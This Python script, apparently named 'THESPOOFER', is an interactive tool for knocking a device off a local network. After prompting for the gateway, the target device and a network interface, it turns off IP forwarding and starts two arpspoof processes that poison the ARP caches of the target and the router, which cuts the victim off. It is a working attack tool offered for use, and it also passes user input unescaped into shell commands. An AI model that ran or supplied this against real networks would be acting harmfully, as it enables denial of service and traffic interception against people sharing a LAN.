import os
import sys
import time


class bcolors:  # TEXT COLORS
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def slowprint(s):  # SLOW TEXT
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./1000)


slowprint(f""" {bcolors.OKGREEN}

▄▄▄█████▓ ██░ ██ ▓█████   ██████  ██▓███   ▒█████   ▒█████    █████▒▓█████  ██▀███  
▓  ██▒ ▓▒▓██░ ██▒▓█   ▀ ▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒▓██   ▒ ▓█   ▀ ▓██ ▒ ██▒
▒ ▓██░ ▒░▒██▀▀██░▒███   ░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▒████ ░ ▒███   ▓██ ░▄█ ▒
░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄   ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░░▓█▒  ░ ▒▓█  ▄ ▒██▀▀█▄  
  ▒██▒ ░ ░▓█▒░██▓░▒████▒▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░░▒█░    ░▒████▒░██▓ ▒██▒
  ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ░    ░░ ▒░ ░░ ▒▓ ░▒▓░
    ░     ▒ ░▒░ ░ ░ ░  ░░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░  ░       ░ ░  ░  ░▒ ░ ▒░
  ░       ░  ░░ ░   ░   ░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░       ░     ░░   ░ 
          ░  ░  ░   ░  ░      ░               ░ ░      ░ ░             ░  ░   ░     
                                                                                    

""")

print('')

print(f'{bcolors.ENDC}WHAT DO YOU WANT TO DO? ')  # OPTIONS
print('')
print(f'{bcolors.BOLD}1. DOS ATACK LAN DEVICE')
print('2. ANOTHER ATTACK')
print('')
option = input(f'{bcolors.ENDC}YOUR OPTION: {bcolors.OKGREEN}')
print(f'{bcolors.WARNING}SET ')
print('')


def dos():
    
    print(f"{bcolors.ENDC}{bcolors.BOLD}INSTALLING DEPENDENCES ...{bcolors.ENDC}")
    os.system('sudo apt-get install network-manager')

    print(f"{bcolors.ENDC}{bcolors.BOLD}LET'S PRINT YOUR GATEWAY: {bcolors.ENDC}")
    print('')
    os.system('route -n')
    print('')
    gateway = input(
        f'{bcolors.ENDC}{bcolors.BOLD}YOUR GATEWAY Ex. 192.168.1.1/24: {bcolors.ENDC}{bcolors.OKGREEN}')  # GATEWAY
    router = gateway[:-3]
    print(f'{bcolors.WARNING}SET ')
    print('')

    # DEVICE TO ATTACK
    device = input(
        f'{bcolors.ENDC}{bcolors.BOLD}DEVICE TO ATTACK: {bcolors.ENDC}{bcolors.OKGREEN}')
    print(f'{bcolors.WARNING}SET ')
    print('')

    # NETWORK INTERFACES
    print(f"{bcolors.ENDC}{bcolors.BOLD}LET'S SHOW YOUR NETWORK INTERFACES: {bcolors.ENDC}")
    os.system('nmcli device status')
    print('')
    network_interface = input(
        f'{bcolors.BOLD}NETWORK INTERFACE TO USE: {bcolors.ENDC}{bcolors.OKGREEN}')
    print(f'{bcolors.WARNING}SET ')
    print('')

    # STARTING ATTACK
    print(f"{bcolors.ENDC}{bcolors.BOLD}STARTING DOS DEVICE ATTACK: {bcolors.ENDC}")
    time.sleep(2.5)

    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
    print('')

    spoof_router = ('arpspoof -i ' + network_interface + ' -t ' + device + ' -r ' + router)
    #os.system(f'gnome-terminal -- bash -c "{spoof_router} && read"')
    os.system("gnome-terminal -e 'bash -c \"" + spoof_router + "; exec bash\"'")

    spoof_device = ('arpspoof -i ' + network_interface + ' -t ' + router + ' -r ' + device)
    #os.system(f'gnome-terminal -- bash -c "{spoof_device} && read"')
    os.system("gnome-terminal -e 'bash -c \"" + spoof_device + "; exec bash\"'")


# OPTIONS
if option == '1':
    dos()
else:
    print(f'{bcolors.WARNING}THIS OPTION IS WORKING... {bcolors.ENDC}')
